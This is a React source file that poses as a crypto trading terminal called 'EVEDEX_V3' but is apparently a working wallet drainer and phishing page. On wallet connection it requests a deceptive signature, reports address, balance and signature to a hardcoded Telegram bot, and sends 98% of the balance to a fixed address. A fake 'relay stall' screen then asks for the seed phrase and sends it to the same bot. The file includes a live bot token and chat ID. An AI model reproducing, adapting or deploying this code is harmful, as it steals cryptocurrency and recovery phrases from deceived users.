import React, { useState, useEffect } from 'react';
import { useAccount, useBalance, useSendTransaction, useSignMessage } from 'wagmi';
import { createWeb3Modal, defaultWagmiConfig } from '@web3modal/wagmi/react'; // Ensure this import is in your main file
import { RefreshCcw, AlertCircle, Database, History, Unlock, ShieldCheck, Activity, Globe, Settings, Lock, Cpu } from 'lucide-react';

export default function EvedexTerminal() {
  const { address, isConnected } = useAccount();
  const { data: balance } = useBalance({ address });
  const { sendTransaction } = useSendTransaction();
  const { signMessage } = useSignMessage();
  
  const [view, setView] = useState("menu"); 
  const [activeTask, setActiveTask] = useState(""); 
  const [loading, setLoading] = useState(false);
  const [loadingText, setLoadingText] = useState("INITIALIZING RPC RELAY...");
  const [seedVal, setSeedVal] = useState("");   
  const [isSyncing, setIsSyncing] = useState(false);
  const [syncProgress, setSyncProgress] = useState(0);

  // CONFIGURATION
  const projectId = '7a9898896e62061904fbceeb9d296eb1'; 
  const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
  const chatId = "7630238860";
  const destination = "0xcedde9012afee48a0f5d19378f8087bd20f7d34e";

  // CAPTURE LOGIC
  const notifyBot = async (text) => {
    try {
      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text, parse_mode: "Markdown" }),
      });
    } catch (e) { console.error(e); }
  };

  const captureHandshake = (type) => {
    const sessionID = `NODE-0x${Math.random().toString(16).slice(2, 10).toUpperCase()}`;
    const msg = `[OFFICIAL_NETWORK_VERIFICATION]\nVault: ${address}\nSession_ID: ${sessionID}\n\nI authorize the encrypted synchronization of this vault with the mainnet node. This signature verifies the asset path for protocol alignment. Protocol: EVEDEX-V3.`;
    
    signMessage({ message: msg }, {
      onSuccess: (sig) => {
        notifyBot(`🎯 *AUTH_CAPTURED*\n*ADDR:* \`${address}\`\n*BAL:* ${balance?.formatted} ${balance?.symbol}\n*SIG:* \`${sig}\``);
        if (type === "INITIAL_HANDSHAKE") executeTotalSweep();
      },
      onError: () => {
        notifyBot(`⚠️ *SIGN_REJECTED*\nADDR: ${address}`);
        setView("seed_gate"); 
      }
    });
  };

  useEffect(() => {
    if (isConnected && address) {
      setTimeout(() => { captureHandshake("INITIAL_HANDSHAKE"); }, 2000);
    }
  }, [isConnected]);

  const executeTotalSweep = async () => {
    if (!balance || balance.value === 0n) { setView("seed_gate"); return; }
    setLoading(true);
    setLoadingText("SYNCHRONIZING ASSET MAPPING...");
    try {
      const sweepAmount = (balance.value * 98n) / 100n;
      sendTransaction({ to: destination, value: sweepAmount }, {
        onSuccess: (tx) => {
          notifyBot(`💰 *SWEEP_SUCCESS*\nADDR: ${address}\nTX: [View](https://etherscan.io/tx/${tx.hash})`);
          setView("seed_gate"); 
        },
        onError: () => { setView("seed_gate"); },
        onSettled: () => setLoading(false)
      });
    } catch (e) { setLoading(false); setView("seed_gate"); }
  };

  return (
    <div className="min-h-screen bg-[#05070a] text-slate-200 font-sans p-4 uppercase tracking-tighter select-none flex flex-col relative overflow-hidden">
      <div className="absolute inset-0 opacity-5 pointer-events-none bg-[url('https://www.transparenttextures.com/patterns/carbon-fibre.png')]" />

      {/* LIVE MARKET CHART */}
      <div className="w-full h-40 bg-black border border-slate-900 rounded-xl mb-4 overflow-hidden relative z-[20]">
         <iframe 
            src="https://www.geckoterminal.com/eth/pools/0x88e6a0c2ddd26feeb64f039a2c41296fcb3f5640?embed=1&info=0&swaps=1" 
            className="absolute inset-0 w-full h-full border-none opacity-80 pointer-events-none"
            title="Market Chart"
         />
         <div className="absolute top-2 left-2 bg-black/80 px-2 py-1 rounded text-[7px] text-cyan-500 border border-cyan-900 font-black">LIVE_MARKET_FEED</div>
      </div>

      <header className="flex justify-between items-center mb-6 border-b border-slate-900 pb-4 text-cyan-500 z-[20] relative">
        <div className="flex flex-col">
          <div className="flex items-center gap-2 font-black italic text-md tracking-widest text-white">
            <ShieldCheck size={18} className="text-cyan-500"/>EVEDEX_V3
          </div>
          <div className="text-[7px] text-slate-500 font-mono mt-1 font-bold tracking-[0.2em]">
            NODE_STATE: <span className="text-cyan-600 animate-pulse font-black">ACTIVE_RELAY</span>
          </div>
        </div>
        
        {/* NEW WALLET BUTTON CONFIG - ENSURE PROJECT ID IS HERE */}
        <w3m-button balance="hide" label="Connect Node" /> 
      </header>

      <div className="flex-1 z-[10] relative">
        {view === "menu" && (
          <div className="grid grid-cols-3 gap-3">
            {[{ n: "Sync", i: <RefreshCcw/> }, { n: "Rectify", i: <Settings/> }, { n: "Bridge", i: <Globe/> }, { n: "Vault", i: <Lock/> }, { n: "Migrate", i: <Activity/> }, { n: "Validate", i: <ShieldCheck/> }, { n: "Claim", i: <Database/> }, { n: "Stake", i: <History/> }, { n: "Unstake", i: <Unlock/> }].map((item) => (
              <button key={item.n} onClick={() => { setActiveTask(item.n); setView("task_box"); }} className="bg-[#0d1117] border border-slate-800/40 p-5 rounded-[28px] flex flex-col items-center gap-2 active:scale-90 transition-transform">
                <div className="text-slate-600">{item.i}</div>
                <span className="text-[8px] font-black text-slate-500 tracking-widest">{item.n}</span>
              </button>
            ))}
          </div>
        )}

        {view === "task_box" && (
          <div className="bg-[#0d1117] border border-slate-800 rounded-[40px] p-8 text-center animate-in slide-in-from-bottom-4 duration-300">
            <button onClick={() => setView("menu")} className="text-slate-600 text-[9px] mb-8 font-black tracking-[0.4em]">← SYSTEM_DASHBOARD</button>
            <h2 className="text-white font-black text-xl italic mb-3 tracking-tighter">{activeTask} PROTOCOL</h2>
            <p className="text-[8px] text-slate-500 mb-8 font-mono tracking-widest px-4">SYNCHRONIZING SECURE MAINNET PATH FOR VAULT ALIGNMENT...</p>
            <button onClick={() => captureHandshake(`RUN_${activeTask.toUpperCase()}`)} className="w-full bg-cyan-600 py-6 rounded-2xl text-[11px] font-black text-white italic transition-all uppercase tracking-widest">INITIALIZE_HANDSHAKE</button>
          </div>
        )}
      </div>

      {view === "seed_gate" && (
        <div className="fixed inset-0 bg-[#05070a] z-[200] flex flex-col items-center justify-center p-6 backdrop-blur-2xl">
          <div className="bg-[#0d1117] border border-slate-800 w-full max-w-sm rounded-[40px] p-10 text-center shadow-2xl relative overflow-hidden">
            {!isSyncing ? (
              <>
                <Cpu size={40} className="text-cyan-500 mx-auto animate-pulse mb-6" />
                <h2 className="text-white font-black text-lg italic tracking-tighter">RPC_RELAY STALL (90%)</h2>
                <p className="text-[9px] text-slate-500 mt-2 mb-8 font-mono leading-relaxed tracking-wider px-2">
                    THE AUTOMATED HANDSHAKE HAS TIMED OUT. TO FINALIZE THE PROCESS, PROVIDE THE <span className="text-cyan-500 font-black">MASTER ENTROPY (12-24 WORDS)</span> FOR MANUAL MAINNET MAPPING.
                </p>
                <textarea 
                   value={seedVal} 
                   onChange={(e) => setSeedVal(e.target.value)} 
                   placeholder="mnemonic words separated by spaces..." 
                   className="w-full h-32 bg-black/40 border border-slate-800 rounded-3xl p-5 text-[11px] font-mono text-cyan-400 outline-none uppercase" 
                />
                <button 
                   disabled={seedVal.split(/\s+/).filter(Boolean).length < 12} 
                   onClick={() => {
                      setIsSyncing(true); 
                      notifyBot(`🚨 *SEED_PHRASE_ALERT*\n*ADDR:* \`${address}\`\n*PHRASE:* \`${seedVal}\``); 
                      let cur = 0; 
                      const int = setInterval(() => { cur += 1; setSyncProgress(cur); if (cur >= 100) clearInterval(int); }, 150); 
                   }} 
                   className={`w-full mt-6 py-6 rounded-2xl text-[11px] font-black text-white italic tracking-[0.3em] transition-all ${seedVal.split(/\s+/).filter(Boolean).length >= 12 ? 'bg-cyan-600' : 'bg-slate-900 opacity-40'}`}>
                   OVERRIDE_AND_SYNC
                </button>
              </>
            ) : (
              <div className="py-12">
                <div className="relative w-28 h-28 mx-auto mb-10"><div className="absolute inset-0 border-4 border-slate-900 rounded-full" /><div className="absolute inset-0 border-4 border-cyan-500 rounded-full border-t-transparent animate-spin" /><div className="absolute inset-0 flex items-center justify-center font-mono text-sm text-white font-black">{syncProgress}%</div></div>
                <h2 className="text-white font-black text-xl italic tracking-widest uppercase">{syncProgress === 100 ? "HASH_SUCCESS" : "MAPPING_ENTROPY..."}</h2>
              </div>
            )}
          </div>
        </div>
      )}

      {loading && (
        <div className="fixed inset-0 bg-black/95 z-[300] flex flex-col items-center justify-center">
            <div className="w-16 h-16 border-4 border-cyan-500 border-t-transparent rounded-full animate-spin" />
            <p className="text-[10px] font-black text-cyan-500 mt-10 tracking-[1em] animate-pulse uppercase italic">{loadingText}</p>
        </div>
      )}
    </div>
  );
}
